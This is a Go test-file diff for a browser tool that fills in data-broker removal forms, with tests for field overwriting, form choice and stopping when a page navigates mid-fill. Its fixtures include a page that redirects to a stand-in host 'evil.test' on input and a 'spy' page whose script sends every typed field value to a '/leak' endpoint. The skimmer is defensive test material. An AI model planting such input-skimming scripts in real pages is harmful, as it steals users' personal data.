@@ -70,11 +70,32 @@ const captchaPage = `<!doctype html><html><body>
   <button type="submit">Submit request</button>
 </form></body></html>`
 
+// The street-address selectors also match "email_address"; filling the
+// address must not overwrite the email already typed there.
+const addressPage = `<!doctype html><html><body>
+<form method="POST" action="/submitted">
+  <input type="text" name="email_address" placeholder="Your email address">
+  <input name="line1" placeholder="Street address">
+  <input name="city" placeholder="City">
+  <button type="submit">Submit request</button>
+</form></body></html>`
+
+// A site search form with a pre-filled box comes before the removal form.
+// Only the form we filled may be submitted.
+const searchFirstPage = `<!doctype html><html><body>
+<form method="POST" action="/search"><input name="q" value="privacy"><button type="submit">Search</button></form>
+<form method="POST" action="/submitted">
+  <input type="email" name="email">
+  <button type="submit">Submit request</button>
+</form></body></html>`
+
 type formSite struct {
 	*httptest.Server
 	mu          sync.Mutex
 	submissions []url.Values
 	dangerHits  int
+	searches    int
+	leaks       []string // field values another site's page saw
 }
 
 func (f *formSite) submitted() []url.Values {
@@ -99,6 +120,37 @@ func newFormSite(t *testing.T) *formSite {
 	mux.HandleFunc("/js-away", func(w http.ResponseWriter, r *http.Request) {
 		_, _ = fmt.Fprintf(w, `<html><body><script>location.href = "http://evil.test:%s/form";</script></body></html>`, //nolint:gosec // G705: test fixture
 			r.URL.Query().Get("port"))
+	})
+	mux.HandleFunc("/address", page(addressPage))
+	mux.HandleFunc("/search-first", page(searchFirstPage))
+	mux.HandleFunc("/search", func(w http.ResponseWriter, r *http.Request) {
+		f.mu.Lock()
+		f.searches++
+		f.mu.Unlock()
+	})
+	// Starts navigating to another site as soon as the first field changes.
+	mux.HandleFunc("/hop", func(w http.ResponseWriter, r *http.Request) {
+		//nolint:gosec // G705: test fixture
+		_, _ = fmt.Fprintf(w, `<!doctype html><html><body><form method="POST" action="/submitted">
+  <input type="email" name="email" oninput="location.href = 'http://evil.test:%s/spy'">
+  <input name="first_name"><input name="last_name"><input type="tel" name="phone">
+  <button type="submit">Submit request</button>
+</form></body></html>`, r.URL.Query().Get("port"))
+	})
+	// Another site's page that reports anything typed into it.
+	mux.HandleFunc("/spy", page(`<!doctype html><html><body><form>
+  <input type="email" name="email"><input name="first_name"><input name="last_name"><input type="tel" name="phone">
+</form><script>
+document.querySelectorAll('input').forEach(function(el) {
+  ['input', 'change', 'keyup'].forEach(function(ev) {
+    el.addEventListener(ev, function() { fetch('/leak?v=' + encodeURIComponent(el.name + '=' + el.value)); });
+  });
+});
+</script></body></html>`))
+	mux.HandleFunc("/leak", func(w http.ResponseWriter, r *http.Request) {
+		f.mu.Lock()
+		f.leaks = append(f.leaks, r.URL.Query().Get("v"))
+		f.mu.Unlock()
 	})
 	mux.HandleFunc("/danger", func(w http.ResponseWriter, r *http.Request) {
 		f.mu.Lock()
@@ -326,4 +378,76 @@ func mustURL(t *testing.T, raw string) *url.URL {
 		t.Fatal(err)
 	}
 	return u
+}
+
+func waitForSubmission(t *testing.T, site *formSite) url.Values {
+	t.Helper()
+	deadline := time.Now().Add(5 * time.Second)
+	for len(site.submitted()) == 0 && time.Now().Before(deadline) {
+		time.Sleep(50 * time.Millisecond)
+	}
+	subs := site.submitted()
+	if len(subs) != 1 {
+		t.Fatalf("server received %d submissions, want 1", len(subs))
+	}
+	return subs[0]
+}
+
+func TestFillNeverOverwritesAFilledField(t *testing.T) {
+	site := newFormSite(t)
+	b := newTestBrowser(t)
+	req := fillReq(site, "/address", true)
+	req.Profile.Address, req.Profile.City = "1 Main St", "Springfield"
+
+	if res, err := b.NavigateAndFill(req); err != nil || !res.SubmitAttempted {
+		t.Fatalf("err=%v result=%+v", err, res)
+	}
+	sub := waitForSubmission(t, site)
+	for field, want := range map[string]string{"email_address": "jane@example.com", "line1": "1 Main St", "city": "Springfield"} {
+		if got := sub.Get(field); got != want {
+			t.Errorf("%s = %q, want %q", field, got, want)
+		}
+	}
+}
+
+func TestSubmitsOnlyTheFormItFilled(t *testing.T) {
+	site := newFormSite(t)
+	b := newTestBrowser(t)
+
+	if res, err := b.NavigateAndFill(fillReq(site, "/search-first", true)); err != nil || !res.SubmitAttempted {
+		t.Fatalf("err=%v result=%+v", err, res)
+	}
+	if sub := waitForSubmission(t, site); sub.Get("email") != "jane@example.com" {
+		t.Errorf("email = %q", sub.Get("email"))
+	}
+	site.mu.Lock()
+	defer site.mu.Unlock()
+	if site.searches != 0 {
+		t.Error("submitted the pre-filled search form instead of the removal form")
+	}
+}
+
+// If the page navigates away while fields are being filled, nothing more is
+// filled: the other site must never see the profile.
+func TestFillStopsWhenThePageNavigates(t *testing.T) {
+	site := newFormSite(t)
+	b := newTestBrowser(t)
+	port := mustURL(t, site.URL).Port()
+
+	res, err := b.NavigateAndFill(FillRequest{
+		URL: "http://broker.test:" + port + "/hop?port=" + port, BrokerID: "acme", Profile: testProfile, Submit: true,
+		Allowed: func(u *url.URL) bool { return u.Hostname() == "broker.test" },
+	})
+	if err == nil {
+		t.Errorf("no error after the page navigated mid-fill: %+v", res)
+	}
+	if res.SubmitAttempted {
+		t.Error("submitted after the page navigated")
+	}
+	time.Sleep(time.Second) // let any leak requests arrive
+	site.mu.Lock()
+	defer site.mu.Unlock()
+	if len(site.leaks) > 0 {
+		t.Errorf("another site's page saw the profile: %q", site.leaks)
+	}
 }
